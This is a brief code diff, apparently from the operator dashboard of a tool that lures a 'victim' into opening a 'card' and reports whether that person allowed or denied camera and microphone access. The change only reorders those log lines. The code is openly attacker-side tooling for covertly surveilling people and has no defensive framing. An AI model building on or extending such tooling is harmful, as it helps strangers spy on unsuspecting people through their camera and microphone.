@@ -44,11 +44,11 @@
 
     peer.on('connection', conn => {
       conn.on('data', data => {
-        if (data.event === 'page-open')      log('📥 Victim opened the card');
-        if (data.event === 'camera-allowed') log('📷 Victim allowed camera');
-        if (data.event === 'camera-denied')  log('🚫 Victim denied camera');
-        if (data.event === 'mic-allowed')    log('🎙️ Victim allowed mic');
-        if (data.event === 'mic-denied')     log('🚫 Victim denied mic');
+        if (data.event === 'page-open')       log('📥 Victim opened the card');
+        if (data.event === 'mic-allowed')     log('🎙️ Victim allowed mic');
+        if (data.event === 'mic-denied')      log('🚫 Victim denied mic');
+        if (data.event === 'camera-allowed')  log('📷 Victim allowed camera');
+        if (data.event === 'camera-denied')   log('🚫 Victim denied camera');
       });
     });
 
